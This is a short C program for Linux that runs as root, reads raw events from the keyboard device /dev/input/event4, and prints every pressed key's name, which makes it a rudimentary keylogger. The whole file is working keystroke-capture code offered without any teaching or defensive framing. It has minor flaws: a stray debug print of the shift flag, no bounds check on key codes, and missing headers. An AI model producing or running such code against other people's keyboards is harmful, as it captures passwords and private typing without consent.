#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h>

#define KEY_PRESS 1
#define KEY_RELEASE 0

static const char *keys_upper[] = {"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "MINUS", "EQUAL", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "LEFTBRACE", "RIGHTBRACE", "ENTER", "LEFTCTRL", "A", "S", "D", "F", "G", "H", "J", "K", "L", "SEMICOLON", "APOSTROPHE", "GRAVE", "LEFTSHIFT", "BACKSLASH", "Z", "X", "C", "V", "B", "N", "M", "COMMA", "DOT", "SLASH", "RIGHTSHIFT", "KPASTERISK", "LEFTALT", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "KP7", "KP8", "KP9", "KPMINUS", "KP4", "KP5", "KP6", "KPPLUS", "KP1", "KP2", "KP3", "KP0", "KPDOT", "ZENKAKUHANKAKU", "102ND", "F11", "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA", "MUHENKAN", "KPJPCOMMA", "KPENTER", "RIGHTCTRL", "KPSLASH", "SYSRQ", "RIGHTALT", "LINEFEED", "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END", "DOWN", "PAGEDOWN", "INSERT", "DELETE", "MACRO", "MUTE", "VOLUMEDOWN", "VOLUMEUP", "POWER"};
static const char *keys_lower[] = {"reserved", "esc", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "minus", "equal", "backspace", "tab", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "leftbrace", "rightbrace", "enter", "leftctrl", "a", "s", "d", "f", "g", "h", "j", "k", "l", "semicolon", "apostrophe", "grave", "leftshift", "backslash", "z", "x", "c", "v", "b", "n", "m", "comma", "dot", "slash", "rightshift", "kpasterisk", "leftalt", "space", "capslock", "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "numlock", "scrolllock", "kp7", "kp8", "kp9", "kpminus", "kp4", "kp5", "kp6", "kpplus", "kp1", "kp2", "kp3", "kp0", "kpdot", "zenkakuhankaku", "102nd", "f11", "f12", "ro", "katakana", "hiragana", "henkan", "katakanahiragana", "muhenkan", "kpjpcomma", "kpenter", "rightctrl", "kpslash", "sysrq", "rightalt", "linefeed", "home", "up", "pageup", "left", "right", "end", "down", "pagedown", "insert", "delete", "macro", "mute", "volumedown", "volumeup", "power"};

static int isShiftPressed(int eventcode){
	if((eventcode == 42) || (eventcode == 54)){
		return 1;
	}
	return 0;
}

static void print_char(int eventcode, int shift){
	printf("%d\n", shift);
	if(shift == 1){
		printf("%s ", keys_upper[eventcode]);
	}
	if(shift == 0){
		printf("%s ", keys_lower[eventcode]);
	}
}

int main(){
	typedef struct input_event input_event;
	input_event event;
	int shift = 0;
	if(geteuid() != 0){
		printf("You must be root\n");
		exit(0);
	}
	int fp = open("/dev/input/event4", O_RDONLY);
	if(fp == -1){
		printf("Device file not found\n");
		exit(0);
	}
	while(1){
		if(read(fp, &event, sizeof(input_event))>0){
			if(event.type == EV_KEY){
				if(event.value == KEY_PRESS){
					if(isShiftPressed(event.code)){
						shift = 1;
					}
					print_char(event.code, shift);
				}
				if(event.value == KEY_RELEASE){
					if(isShiftPressed(event.code)){
						shift = 0;
					}
				}
			}
		}
	}
	close(fp);
	return 0;
}
